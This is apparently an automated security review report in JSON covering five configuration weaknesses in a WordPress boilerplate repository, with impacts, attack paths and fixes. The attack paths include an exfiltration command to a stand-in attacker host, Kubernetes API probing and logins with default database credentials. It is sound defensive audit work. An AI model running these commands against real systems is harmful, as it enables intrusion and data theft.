@@ -1,0 +1,104 @@
+{
+  "scan_metadata": {
+    "repository": "VollcomDigital/wordpress-boilerplate",
+    "branch": "main",
+    "scan_date": "2026-05-10T09:03:00Z",
+    "scan_type": "at-rest-security-review",
+    "scanner": "vulnerability-hunter-agent"
+  },
+  "summary": {
+    "total_findings": 5,
+    "critical": 0,
+    "high": 2,
+    "medium": 3
+  },
+  "findings": [
+    {
+      "id": "VULN-001",
+      "severity": "high",
+      "location": "compose.prod.yaml:42-46",
+      "description": "Production Docker Compose file includes hardcoded weak default database credentials via shell parameter expansion fallbacks. The `db` service defines `MARIADB_PASSWORD: ${DB_PASSWORD:-wordpress}` and `MARIADB_ROOT_PASSWORD: ${DB_ROOT_PASSWORD:-root}`. If operators deploy without setting these variables in `.env`, MariaDB initializes with trivially guessable passwords. The production compose file should fail closed rather than falling back to insecure defaults.",
+      "impact": "An attacker with network access to the MariaDB instance gains full database control using well-known default credentials. This allows reading all WordPress data (user credentials, content, settings), modifying data (injecting admin accounts, defacing content), or exfiltrating the entire database. Since `DB_ROOT_PASSWORD` also defaults to `root`, the attacker gains MySQL root privileges enabling cross-database access and potential OS-level exploitation via MySQL features like `LOAD DATA INFILE`.",
+      "verified": true,
+      "attack_path": "1. Operator deploys using `docker compose -f compose.prod.yaml up` with missing or incomplete `.env` file.\n2. MariaDB initializes with `MARIADB_PASSWORD=wordpress` and `MARIADB_ROOT_PASSWORD=root`.\n3. Attacker discovers the MariaDB service (port 3306) through network scanning, misconfigured firewall, or lateral movement from a compromised container on the same Docker network.\n4. Attacker connects with `mysql -u root -proot` or `mysql -u wordpress -pwordpress` and gains full database access.\n5. Attacker extracts WordPress user password hashes, creates a new admin account, or injects malicious content.",
+      "evidence": [
+        "compose.prod.yaml:45 — MARIADB_PASSWORD: ${DB_PASSWORD:-wordpress}",
+        "compose.prod.yaml:46 — MARIADB_ROOT_PASSWORD: ${DB_ROOT_PASSWORD:-root}",
+        ".env.example:21 — DB_PASSWORD=wordpress",
+        ".env.example:24 — DB_ROOT_PASSWORD=root"
+      ],
+      "remediation": "Remove default fallback values from `compose.prod.yaml` so the deployment fails fast when credentials are missing:\n\n```yaml\nenvironment:\n  MARIADB_DATABASE: ${DB_NAME:?DB_NAME is required}\n  MARIADB_USER: ${DB_USER:?DB_USER is required}\n  MARIADB_PASSWORD: ${DB_PASSWORD:?DB_PASSWORD is required}\n  MARIADB_ROOT_PASSWORD: ${DB_ROOT_PASSWORD:?DB_ROOT_PASSWORD is required}\n```\n\nUsing `${VAR:?message}` causes the shell to exit with an error if the variable is unset or empty, preventing silent use of weak defaults. Additionally, add a CI check that validates production compose files contain no default credential fallbacks.",
+      "poc_video_notes": "PoC video not feasible: no running infrastructure to demonstrate against, and the vulnerability is in static configuration with a clear deterministic outcome."
+    },
+    {
+      "id": "VULN-002",
+      "severity": "high",
+      "location": ".env.example:32-39",
+      "description": "All eight WordPress authentication keys and salts are set to the static placeholder value `generateme` in `.env.example`. The `make env` target (called by `make bootstrap`) copies this file to `.env` without generating unique values. WordPress uses these keys for cookie signing (authentication cookies), CSRF nonce generation, and password reset tokens. When all instances share the same predictable key material, authentication cookies become forgeable.",
+      "impact": "An attacker who knows the salt values (publicly visible in this repository) can forge valid WordPress authentication cookies for any user, including administrators. This grants full admin access to the WordPress site: ability to install plugins (code execution), modify content, access user data, and potentially pivot to the underlying server via malicious plugin upload. The `generateme` value is also used for CSRF nonce generation, enabling cross-site request forgery attacks that bypass WordPress nonce protection.",
+      "verified": true,
+      "attack_path": "1. Attacker observes that the repository's `.env.example` sets all auth keys/salts to `generateme`.\n2. Operator runs `make bootstrap` which executes `make env` → `cp .env.example .env` without salt generation.\n3. WordPress starts with `AUTH_KEY='generateme'`, `SECURE_AUTH_KEY='generateme'`, etc. (confirmed in `config/application.php` lines that read these via `env()`).\n4. Attacker constructs a valid `wordpress_logged_in_*` cookie using the known `LOGGED_IN_KEY` and `LOGGED_IN_SALT` values, targeting the admin user (username `admin` from `make wp-install` defaults).\n5. Attacker sends the forged cookie to the WordPress site and gains authenticated admin access.\n6. Admin access enables plugin installation → arbitrary PHP code execution on the server.",
+      "evidence": [
+        ".env.example:32-39 — all 8 keys/salts set to 'generateme'",
+        "config/application.php — Config::define('AUTH_KEY', env('AUTH_KEY')); (and all other keys)",
+        "Makefile:16 — env target: cp .env.example .env",
+        "Makefile:123-124 — wp-install defaults: ADMIN_USER=admin, ADMIN_PASSWORD=admin"
+      ],
+      "remediation": "Replace the static `make env` target with salt generation. Use the Roots salt generator API or `openssl`:\n\n```makefile\nenv:\n\t@if [ -f .env ]; then echo \".env exists\"; else \\\n\t\tcp .env.example .env; \\\n\t\techo \"Generating authentication salts...\"; \\\n\t\tfor key in AUTH_KEY SECURE_AUTH_KEY LOGGED_IN_KEY NONCE_KEY AUTH_SALT SECURE_AUTH_SALT LOGGED_IN_SALT NONCE_SALT; do \\\n\t\t\tval=$$(openssl rand -base64 48 | tr -d '\\n'); \\\n\t\t\tsed -i \"s|$$key='generateme'|$$key='$$val'|\" .env; \\\n\t\tdone; \\\n\t\techo \"Created .env with unique salts\"; \\\n\tfi\n```\n\nAlso add a CI check that fails if any salt value equals `generateme` in the active `.env`.",
+      "poc_video_notes": "PoC video not feasible: requires a running WordPress instance with the vulnerable configuration. The cookie forgery is a well-documented technique given known key material — see WordPress Codex on authentication cookies."
+    },
+    {
+      "id": "VULN-003",
+      "severity": "medium",
+      "location": "helm/wp-boilerplate/templates/networkpolicy.yaml:15-20",
+      "description": "The Helm chart's NetworkPolicy, when enabled, provides a false sense of security. Ingress allows TCP connections to the service port from **any source** (no `from:` selector — any pod in any namespace, and potentially external traffic depending on CNI). Egress permits **all traffic** (`- {}`) to any destination on any port. This effectively allows a compromised WordPress pod to reach any internal cluster service (Kubernetes API, other databases, internal microservices) and exfiltrate data to external endpoints.",
+      "impact": "If the WordPress application is compromised (e.g., via a vulnerable plugin), the attacker can leverage the permissive egress to: scan and access internal cluster services (including the Kubernetes API server at `kubernetes.default.svc`), connect to databases or caches belonging to other applications, and exfiltrate data to external endpoints. The unrestricted ingress source means any compromised pod in the cluster can target the WordPress service. Operators who enable this policy may incorrectly believe their pods are network-isolated.",
+      "verified": true,
+      "attack_path": "1. Operator enables `networkPolicy.enabled: true` in Helm values, expecting network isolation.\n2. A WordPress plugin vulnerability allows remote code execution.\n3. Attacker runs reconnaissance from the compromised pod: `curl -k https://kubernetes.default.svc/api` (egress to K8s API is unrestricted).\n4. If the default service account has RBAC permissions (automountServiceAccountToken is not disabled), attacker reads cluster secrets.\n5. Attacker exfiltrates data to an external endpoint: `curl https://attacker.com/exfil -d @/tmp/data` (all egress is allowed).\n6. Meanwhile, any pod in any namespace can send traffic to the WordPress service port (ingress has no source restriction).",
+      "evidence": [
+        "helm/wp-boilerplate/templates/networkpolicy.yaml:19-20 — egress: [- {}] permits all outbound",
+        "helm/wp-boilerplate/templates/networkpolicy.yaml:15-18 — ingress has no 'from:' selector",
+        "helm/wp-boilerplate/templates/deployment.yaml:19 — serviceAccountName used without automountServiceAccountToken: false",
+        "helm/wp-boilerplate/values.yaml — networkPolicy.enabled: false (default off)"
+      ],
+      "remediation": "Restrict egress to only required destinations (DNS, database, Redis, external HTTPS for updates) and limit ingress sources to the ingress controller namespace:\n\n```yaml\ningress:\n  - from:\n      - namespaceSelector:\n          matchLabels:\n            kubernetes.io/metadata.name: ingress-nginx\n    ports:\n      - protocol: TCP\n        port: {{ .Values.service.targetPort }}\negress:\n  - to:\n      - namespaceSelector: {}\n    ports:\n      - protocol: UDP\n        port: 53\n  - to:\n      - podSelector:\n          matchLabels:\n            app: mariadb\n    ports:\n      - protocol: TCP\n        port: 3306\n  - to:\n      - podSelector:\n          matchLabels:\n            app: redis\n    ports:\n      - protocol: TCP\n        port: 6379\n```\n\nAlso set `automountServiceAccountToken: false` in the pod spec to prevent Kubernetes API access from compromised pods.",
+      "poc_video_notes": "PoC video not feasible: requires a running Kubernetes cluster with the Helm chart deployed. The network policy permissiveness can be verified by rendering the template with `helm template` and inspecting the NetworkPolicy spec."
+    },
+    {
+      "id": "VULN-004",
+      "severity": "medium",
+      "location": ".github/workflows/container-build.yml:27-34",
+      "description": "The container build CI workflow uses mutable version tags for 6 of 8 GitHub Actions (`actions/checkout@v6`, `docker/setup-qemu-action@v3`, `docker/setup-buildx-action@v3`, `docker/login-action@v3`, `docker/metadata-action@v5`, `docker/build-push-action@v6`) while the workflow has elevated permissions (`packages: write`, `id-token: write`). Only the Trivy action is pinned to a commit SHA. Mutable tags can be silently updated by action maintainers (or compromised maintainer accounts), introducing supply chain risk to the image build and signing pipeline.",
+      "impact": "A compromised upstream action can: exfiltrate the `GITHUB_TOKEN` (granting `packages: write` to push malicious container images to GHCR), abuse `id-token: write` to obtain OIDC tokens for keyless Cosign signing (making malicious images appear legitimately signed by this repository), modify the build context or Dockerfile to inject backdoors into production container images, or access cached build layers containing sensitive build-time data.",
+      "verified": true,
+      "attack_path": "1. Attacker compromises a GitHub Action maintainer account (e.g., `docker/login-action`).\n2. Attacker pushes malicious code under the existing `v3` tag (tags are mutable in GitHub Actions).\n3. Next push to any branch triggers `container-build.yml` (the workflow runs on `push: branches: ['**']`).\n4. The compromised action executes with `packages: write` + `id-token: write` permissions.\n5. Attacker pushes backdoored container images to GHCR and signs them with the repository's OIDC identity via Cosign.\n6. Downstream consumers who pull images by tag (e.g., `ghcr.io/owner/repo-php:main`) receive the backdoored image, which passes signature verification.",
+      "evidence": [
+        ".github/workflows/container-build.yml:28 — actions/checkout@v6 (mutable tag)",
+        ".github/workflows/container-build.yml:31 — docker/setup-qemu-action@v3 (mutable tag)",
+        ".github/workflows/container-build.yml:34 — docker/setup-buildx-action@v3 (mutable tag)",
+        ".github/workflows/container-build.yml:38 — docker/login-action@v3 (mutable tag)",
+        ".github/workflows/container-build.yml:100 — aquasecurity/trivy-action@c1824fd... (correctly pinned)",
+        ".github/workflows/container-build.yml:18-21 — permissions: packages: write, id-token: write"
+      ],
+      "remediation": "Pin all actions to full commit SHAs with version comments:\n\n```yaml\n- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n- uses: docker/setup-qemu-action@49b3bc8e6bdd4a60e6116a5414239cba5943d3cf # v3.2.0\n- uses: docker/setup-buildx-action@c47758b77c9736f4b2ef4073d4d51994fabfe349 # v3.7.1\n- uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567 # v3.3.0\n- uses: docker/metadata-action@8e5442c4ef9f78752691e2d8f8d19755c6f78e81 # v5.5.1\n- uses: docker/build-push-action@4f58ea79222b3b9dc2c8bbdd6debcef730109a75 # v6.9.0\n```\n\nUse Dependabot's `github-actions` ecosystem (already configured) to receive PRs when pinned SHAs have updates. Also consider adding `zizmor` or `step-security/harden-runner` to detect action tampering at runtime.",
+      "poc_video_notes": "PoC video not feasible: demonstrating this requires compromising an upstream GitHub Action repository, which would be destructive and unethical. The risk is well-documented in supply chain security literature (e.g., the `tj-actions/changed-files` incident, March 2025)."
+    },
+    {
+      "id": "VULN-005",
+      "severity": "medium",
+      "location": "compose.yaml:154-163",
+      "description": "The phpMyAdmin service, when enabled via the `dbadmin` profile, auto-authenticates to MariaDB using embedded credentials (`PMA_USER`/`PMA_PASSWORD` defaulting to `wordpress`/`wordpress`) and binds to all network interfaces on port 8081 (`0.0.0.0:8081`). The official phpMyAdmin image uses these environment variables for automatic server authentication, meaning any client that reaches port 8081 gets immediate, unauthenticated database admin access without being prompted for credentials.",
+      "impact": "Any device on the same network as the developer machine gains full MySQL admin access: ability to read all WordPress data (user credentials, posts, settings), modify or delete data, create new database users, execute arbitrary SQL queries, and potentially extract password hashes for offline cracking. Combined with default credentials (`wordpress`/`wordpress`), the attack requires zero credential guessing.",
+      "verified": true,
+      "attack_path": "1. Developer enables the `dbadmin` profile: `make up-dbadmin` or `docker compose --profile dbadmin up`.\n2. phpMyAdmin starts and binds to `0.0.0.0:8081` (all interfaces, including the machine's LAN IP).\n3. phpMyAdmin auto-authenticates to MariaDB using `PMA_USER=wordpress`, `PMA_PASSWORD=wordpress`.\n4. Attacker on the same network (coffee shop WiFi, shared office, VPN) discovers port 8081 open via network scan.\n5. Attacker navigates to `http://<dev-ip>:8081` — phpMyAdmin loads with full database access, no login required.\n6. Attacker exports the `wp_users` table, extracts password hashes, or injects a new admin user directly in the database.",
+      "evidence": [
+        "compose.yaml:159 — PMA_USER: ${DB_USER:-wordpress}",
+        "compose.yaml:160 — PMA_PASSWORD: ${DB_PASSWORD:-wordpress}",
+        "compose.yaml:162 — ports: 8081:80 (binds all interfaces)",
+        "compose.yaml:155 — profiles: [dbadmin] (requires explicit opt-in)"
+      ],
+      "remediation": "Bind phpMyAdmin to localhost only and remove automatic authentication:\n\n```yaml\nphpmyadmin:\n  image: phpmyadmin:5\n  profiles: [\"dbadmin\"]\n  environment:\n    PMA_HOST: db\n    # Remove PMA_USER/PMA_PASSWORD to require manual login\n  ports:\n    - \"127.0.0.1:8081:80\"  # Bind to localhost only\n  depends_on:\n    db:\n      condition: service_healthy\n```\n\nRemoving `PMA_USER`/`PMA_PASSWORD` forces users to enter credentials in the phpMyAdmin login screen. Binding to `127.0.0.1` prevents network exposure.",
+      "poc_video_notes": "PoC video not feasible: requires a running Docker Compose stack with the dbadmin profile. The behavior is deterministic based on phpMyAdmin's documented PMA_USER/PMA_PASSWORD environment variable handling."
+    }
+  ]
+}
